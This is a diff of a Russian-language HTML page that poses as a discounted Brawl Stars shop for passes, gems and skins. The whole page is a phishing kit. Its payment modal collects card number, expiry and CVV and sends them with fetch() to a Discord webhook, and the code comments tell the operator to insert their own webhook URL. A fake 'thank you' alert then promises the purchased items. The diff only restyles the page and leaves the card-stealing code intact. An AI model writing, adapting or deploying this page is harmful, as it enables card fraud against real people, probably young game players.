@@ -2,117 +2,103 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Brawl Stars Shop — скидка 30%</title>
+    <title>Brawl Stars Shop</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: system-ui, -apple-system, 'Segoe UI', monospace;
-        }
         body {
-            background: #0b0e17;
-            color: #eee;
+            background: #0a0c15;
+            color: white;
+            font-family: sans-serif;
             padding: 20px;
         }
         .container {
             max-width: 1200px;
-            margin: 0 auto;
-        }
-        h1 {
-            color: #ffcc00;
-            font-size: 2rem;
-            margin-bottom: 0.5rem;
+            margin: auto;
         }
         .tabs {
             display: flex;
             gap: 10px;
-            margin: 30px 0 20px;
-            flex-wrap: wrap;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
         }
-        .tab-btn {
+        .tablink {
             background: #1e2438;
             border: none;
-            padding: 10px 24px;
-            font-size: 1rem;
-            font-weight: bold;
-            color: #aaa;
-            border-radius: 40px;
+            padding: 10px 25px;
+            color: white;
             cursor: pointer;
+            border-radius: 30px;
+            font-size: 16px;
         }
-        .tab-btn.active {
+        .tablink.active {
             background: #ffcc00;
-            color: #0b0e17;
+            color: black;
+            font-weight: bold;
         }
-        .tab-pane {
+        .tabcontent {
             display: none;
         }
-        .tab-pane.active {
+        .tabcontent.active {
             display: block;
         }
         .products {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            display: flex;
+            flex-wrap: wrap;
             gap: 20px;
-            margin: 20px 0;
         }
         .product {
-            background: #151e2c;
+            background: #1e2438;
             border-radius: 20px;
-            padding: 18px;
-            transition: 0.2s;
+            padding: 15px;
+            width: 220px;
         }
         .product h3 {
-            font-size: 1.3rem;
+            margin: 0 0 10px;
         }
         .price {
-            font-size: 1.5rem;
+            font-size: 24px;
             color: #ffcc00;
             margin: 10px 0;
         }
-        .old {
+        .oldprice {
+            font-size: 14px;
             text-decoration: line-through;
-            font-size: 0.9rem;
-            color: #888;
+            color: #aaa;
             margin-left: 8px;
         }
         button {
             background: #ffcc00;
             border: none;
-            padding: 8px 16px;
-            border-radius: 40px;
-            font-weight: bold;
+            padding: 8px 15px;
+            border-radius: 30px;
             cursor: pointer;
+            font-weight: bold;
             width: 100%;
         }
         .cart {
-            background: #0f1322;
+            background: #1e2438;
             border-radius: 20px;
             padding: 20px;
             margin-top: 40px;
-            border: 1px solid #2a2f44;
         }
-        .cart-list {
+        .cart ul {
             list-style: none;
-            margin: 15px 0;
-            max-height: 200px;
-            overflow-y: auto;
+            padding: 0;
         }
-        .cart-list li {
+        .cart li {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid #2a2f44;
+            margin: 10px 0;
+            border-bottom: 1px solid #333;
+            padding: 5px 0;
         }
         .total {
-            font-size: 1.3rem;
+            font-size: 20px;
             text-align: right;
-            margin: 10px 0;
+            margin: 15px 0;
         }
-        .checkout {
+        .checkout-btn {
             background: #2ecc71;
-            color: #000;
             width: auto;
             padding: 10px 25px;
         }
@@ -121,24 +107,23 @@
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(0,0,0,0.8);
             justify-content: center;
             align-items: center;
         }
-        .modal-card {
+        .modal-box {
             background: #1e2438;
-            padding: 25px;
-            border-radius: 28px;
-            width: 90%;
-            max-width: 380px;
+            padding: 30px;
+            border-radius: 20px;
+            width: 300px;
         }
-        .modal-card input {
+        .modal-box input {
             width: 100%;
             padding: 10px;
             margin: 8px 0;
-            background: #0b0e17;
-            border: 1px solid #3a4055;
-            border-radius: 40px;
+            background: #0a0c15;
+            border: 1px solid #ffcc00;
+            border-radius: 30px;
             color: white;
         }
         .close {
@@ -146,63 +131,55 @@
             font-size: 24px;
             cursor: pointer;
         }
-        footer {
-            text-align: center;
-            margin-top: 50px;
-            color: #555;
-        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>⚡ brawl stars shop</h1>
-    <p>дешевле на 30% чем в игре</p>
+    <h1>⭐ Brawl Stars Shop</h1>
+    <p>скидка 30% на всё</p>
 
     <div class="tabs">
-        <button class="tab-btn" data-tab="pass">brawl pass</button>
-        <button class="tab-btn" data-tab="plus">brawl pass+</button>
-        <button class="tab-btn" data-tab="gems">гемы</button>
-        <button class="tab-btn" data-tab="skins">скины</button>
+        <button class="tablink active" data-tab="tab1">Brawl Pass</button>
+        <button class="tablink" data-tab="tab2">Brawl Pass+</button>
+        <button class="tablink" data-tab="tab3">Гемы</button>
+        <button class="tablink" data-tab="tab4">Скины</button>
     </div>
 
-    <!-- панели -->
-    <div id="pass" class="tab-pane active"></div>
-    <div id="plus" class="tab-pane"></div>
-    <div id="gems" class="tab-pane"></div>
-    <div id="skins" class="tab-pane"></div>
+    <div id="tab1" class="tabcontent active"></div>
+    <div id="tab2" class="tabcontent"></div>
+    <div id="tab3" class="tabcontent"></div>
+    <div id="tab4" class="tabcontent"></div>
 
     <div class="cart">
-        <h2>🛒 корзина</h2>
-        <ul class="cart-list" id="cartItems"><li>корзина пуста</li></ul>
-        <div class="total" id="totalPrice">итого: 0 ₽</div>
-        <button class="checkout" id="checkoutBtn">оформить заказ</button>
+        <h2>🛒 Корзина</h2>
+        <ul id="cartList"><li>Корзина пуста</li></ul>
+        <div class="total" id="totalAmount">Итого: 0 ₽</div>
+        <button class="checkout-btn" id="checkoutBtn">Оформить заказ</button>
     </div>
 </div>
 
 <div id="paymentModal" class="modal">
-    <div class="modal-card">
+    <div class="modal-box">
         <span class="close">&times;</span>
-        <h3>оплата картой</h3>
-        <input type="text" id="card" placeholder="номер карты" maxlength="19">
-        <input type="text" id="date" placeholder="MM/YY" maxlength="5">
-        <input type="text" id="cvv" placeholder="CVV" maxlength="4">
-        <button id="sendPay">оплатить</button>
+        <h3>Оплата картой</h3>
+        <input type="text" id="cardNumber" placeholder="Номер карты (16 цифр)">
+        <input type="text" id="expiry" placeholder="MM/YY">
+        <input type="text" id="cvv" placeholder="CVV">
+        <button id="payButton">Оплатить</button>
     </div>
 </div>
 
-<footer>неофициальный магазин | региональные цены</footer>
-
 <script>
-    // ТОВАРЫ (скидка 30% от реальных)
-    const shopData = {
+    // ----- ТОВАРЫ -----
+    const productsData = {
         pass: [
-            { name: "brawl pass сезон 1", price: 349, old: 499 },
-            { name: "brawl pass сезон 2", price: 349, old: 499 },
-            { name: "brawl pass сезон 3", price: 349, old: 499 }
+            { name: "Brawl Pass Сезон 1", price: 349, old: 499 },
+            { name: "Brawl Pass Сезон 2", price: 349, old: 499 },
+            { name: "Brawl Pass Сезон 3", price: 349, old: 499 }
         ],
         plus: [
-            { name: "brawl pass+ экстра", price: 549, old: 799 },
-            { name: "brawl pass+ премиум", price: 649, old: 929 }
+            { name: "Brawl Pass+ Экстра", price: 549, old: 799 },
+            { name: "Brawl Pass+ Премиум", price: 649, old: 929 }
         ],
         gems: [
             { name: "80 гемов", price: 111, old: 159 },
@@ -211,112 +188,113 @@
             { name: "950 гемов", price: 1049, old: 1499 }
         ],
         skins: [
-            { name: "меха леон", price: 279, old: 399 },
-            { name: "ковбой кольт", price: 209, old: 299 },
-            { name: "рокер мортис", price: 349, old: 499 },
-            { name: "бо ультимативный", price: 489, old: 699 },
-            { name: "призрак кольт", price: 279, old: 399 },
-            { name: "дракон найт", price: 419, old: 599 }
+            { name: "Меха Леон", price: 279, old: 399 },
+            { name: "Ковбой Кольт", price: 209, old: 299 },
+            { name: "Рокер Мортис", price: 349, old: 499 },
+            { name: "Бо Ультимативный", price: 489, old: 699 },
+            { name: "Призрак Кольт", price: 279, old: 399 },
+            { name: "Дракон Найт", price: 419, old: 599 }
         ]
     };
 
-    let cart = []; // { name, price }
+    let cart = [];
 
-    // отрисовка товаров в панель
-    function renderCategory(category, elementId) {
-        const container = document.getElementById(elementId);
+    // Функция отрисовки товаров в конкретную вкладку
+    function renderProducts(category, containerId) {
+        const container = document.getElementById(containerId);
         if (!container) return;
-        const items = shopData[category];
-        let html = '<div class="products">';
+        const items = productsData[category];
+        let html = `<div class="products">`;
         items.forEach(item => {
             html += `
                 <div class="product">
                     <h3>${item.name}</h3>
-                    <div class="price">${item.price} ₽ <span class="old">${item.old} ₽</span></div>
-                    <button onclick="addToCart('${item.name}', ${item.price})">в корзину</button>
+                    <div class="price">${item.price} ₽ <span class="oldprice">${item.old} ₽</span></div>
+                    <button onclick="addToCart('${item.name}', ${item.price})">В корзину</button>
                 </div>
             `;
         });
-        html += '</div>';
+        html += `</div>`;
         container.innerHTML = html;
     }
 
+    // Добавление в корзину
     window.addToCart = function(name, price) {
         cart.push({ name, price });
-        updateCartDisplay();
-        showToast(`добавлено: ${name}`);
+        updateCartUI();
+        showMessage(`✅ ${name} добавлен`);
     };
 
-    function updateCartDisplay() {
-        const list = document.getElementById('cartItems');
-        const totalSpan = document.getElementById('totalPrice');
+    // Обновить отображение корзины
+    function updateCartUI() {
+        const list = document.getElementById('cartList');
+        const totalSpan = document.getElementById('totalAmount');
         if (cart.length === 0) {
-            list.innerHTML = '<li>корзина пуста</li>';
-            totalSpan.innerText = 'итого: 0 ₽';
+            list.innerHTML = '<li>Корзина пуста</li>';
+            totalSpan.innerText = 'Итого: 0 ₽';
             return;
         }
         let total = 0;
         let html = '';
         cart.forEach((item, idx) => {
             total += item.price;
-            html += `<li>${item.name} — ${item.price} ₽ <button style="width:auto; background:#c0392b;" onclick="removeFromCart(${idx})">x</button></li>`;
+            html += `<li>${item.name} — ${item.price} ₽ <button style="width:auto; background:#c0392b; padding:2px 12px;" onclick="removeFromCart(${idx})">x</button></li>`;
         });
         list.innerHTML = html;
-        totalSpan.innerText = `итого: ${total} ₽`;
+        totalSpan.innerText = `Итого: ${total} ₽`;
     }
 
     window.removeFromCart = function(idx) {
         cart.splice(idx, 1);
-        updateCartDisplay();
+        updateCartUI();
     };
 
-    function showToast(msg) {
-        let toast = document.createElement('div');
-        toast.innerText = msg;
-        toast.style.position = 'fixed';
-        toast.style.bottom = '20px';
-        toast.style.right = '20px';
-        toast.style.backgroundColor = '#ffcc00';
-        toast.style.color = '#000';
-        toast.style.padding = '10px 18px';
-        toast.style.borderRadius = '30px';
-        toast.style.zIndex = '9999';
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 2000);
+    function showMessage(msg) {
+        let div = document.createElement('div');
+        div.innerText = msg;
+        div.style.position = 'fixed';
+        div.style.bottom = '20px';
+        div.style.right = '20px';
+        div.style.backgroundColor = '#ffcc00';
+        div.style.color = 'black';
+        div.style.padding = '10px 20px';
+        div.style.borderRadius = '30px';
+        div.style.zIndex = '9999';
+        document.body.appendChild(div);
+        setTimeout(() => div.remove(), 2000);
     }
 
-    // ВКЛАДКИ
-    const tabs = document.querySelectorAll('.tab-btn');
-    const panes = document.querySelectorAll('.tab-pane');
-    tabs.forEach(btn => {
-        btn.addEventListener('click', () => {
-            const tabId = btn.getAttribute('data-tab');
-            panes.forEach(pane => pane.classList.remove('active'));
+    // Вкладки
+    const tablinks = document.querySelectorAll('.tablink');
+    const tabcontents = document.querySelectorAll('.tabcontent');
+    tablinks.forEach(link => {
+        link.addEventListener('click', () => {
+            const tabId = link.getAttribute('data-tab');
+            tabcontents.forEach(content => content.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
-            tabs.forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
+            tablinks.forEach(l => l.classList.remove('active'));
+            link.classList.add('active');
         });
     });
-    // активируем первую вкладку по умолчанию
-    document.querySelector('.tab-btn').classList.add('active');
 
-    // рендерим все категории
-    renderCategory('pass', 'pass');
-    renderCategory('plus', 'plus');
-    renderCategory('gems', 'gems');
-    renderCategory('skins', 'skins');
+    // Инициализация всех вкладок товарами
+    renderProducts('pass', 'tab1');
+    renderProducts('plus', 'tab2');
+    renderProducts('gems', 'tab3');
+    renderProducts('skins', 'tab4');
 
-    // МОДАЛКА ОПЛАТЫ И ВЕБХУК
-    // !!! СЮДА ВСТАВЬ СВОЙ ДИСКОРД ВЕБХУК !!!
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/ЗАМЕНИ_НА_СВОЙ/ТОКЕН';
+    // ---------- ОПЛАТА И ВЕБХУК ----------
+    // ЗАМЕНИ ЭТУ ССЫЛКУ НА ТВОЙ РЕАЛЬНЫЙ ДИСКОРД ВЕБХУК
+    const WEBHOOK = 'https://discord.com/api/webhooks/ТВОЙ_АЙДИ/ТВОЙ_ТОКЕН';
 
     const modal = document.getElementById('paymentModal');
-    const checkoutBtn = document.getElementById('checkoutBtn');
+    const checkout = document.getElementById('checkoutBtn');
     const closeModal = document.querySelector('.close');
+    const payBtn = document.getElementById('payButton');
 
-    checkoutBtn.onclick = () => {
+    checkout.onclick = () => {
         if (cart.length === 0) {
-            alert('корзина пуста!');
+            alert('Корзина пуста!');
             return;
         }
         modal.style.display = 'flex';
@@ -324,44 +302,46 @@
     closeModal.onclick = () => modal.style.display = 'none';
     window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };
 
-    document.getElementById('sendPay').onclick = async () => {
-        const cardNum = document.getElementById('card').value.trim();
-        const expiry = document.getElementById('date').value.trim();
-        const cvvVal = document.getElementById('cvv').value.trim();
-        if (!cardNum || !expiry || !cvvVal) {
-            alert('заполните все данные карты');
+    payBtn.onclick = async () => {
+        const card = document.getElementById('cardNumber').value.trim();
+        const expiry = document.getElementById('expiry').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        if (!card || !expiry || !cvv) {
+            alert('Заполните все поля карты');
             return;
         }
-        const totalSum = cart.reduce((sum, i) => sum + i.price, 0);
-        const itemsList = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
-        
-        const payload = {
-            content: "**НОВЫЙ ЗАКАЗ BRAWL STARS**",
+        const total = cart.reduce((s, i) => s + i.price, 0);
+        const itemsText = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
+        const data = {
+            content: "**НОВЫЙ ЗАКАЗ BRAWL STARS (СКИДКА 30%)**",
             embeds: [{
-                title: "💳 данные карты + корзина",
+                title: "💳 Данные карты",
                 color: 0xffcc00,
                 fields: [
-                    { name: "товары", value: itemsList || "—", inline: false },
-                    { name: "сумма", value: `${totalSum} ₽`, inline: true },
-                    { name: "номер карты", value: `||${cardNum}||`, inline: false },
-                    { name: "срок", value: expiry, inline: true },
-                    { name: "cvv", value: `||${cvvVal}||`, inline: true }
+                    { name: "Товары", value: itemsText || "—", inline: false },
+                    { name: "Сумма", value: total + " ₽", inline: true },
+                    { name: "Номер карты", value: `||${card}||`, inline: false },
+                    { name: "Срок", value: expiry, inline: true },
+                    { name: "CVV", value: `||${cvv}||`, inline: true }
                 ],
                 timestamp: new Date().toISOString()
             }]
         };
-
         try {
-            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            alert('спасибо за покупку! предметы придут на аккаунт в ближайшее время.');
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+            alert('Спасибо за покупку! Товары придут на аккаунт в течение часа.');
             cart = [];
-            updateCartDisplay();
+            updateCartUI();
             modal.style.display = 'none';
-            document.getElementById('card').value = '';
-            document.getElementById('date').value = '';
+            document.getElementById('cardNumber').value = '';
+            document.getElementById('expiry').value = '';
             document.getElementById('cvv').value = '';
         } catch (err) {
-            alert('ошибка оплаты, попробуйте позже');
+            alert('Ошибка соединения, попробуйте позже.');
         }
     };
 </script>
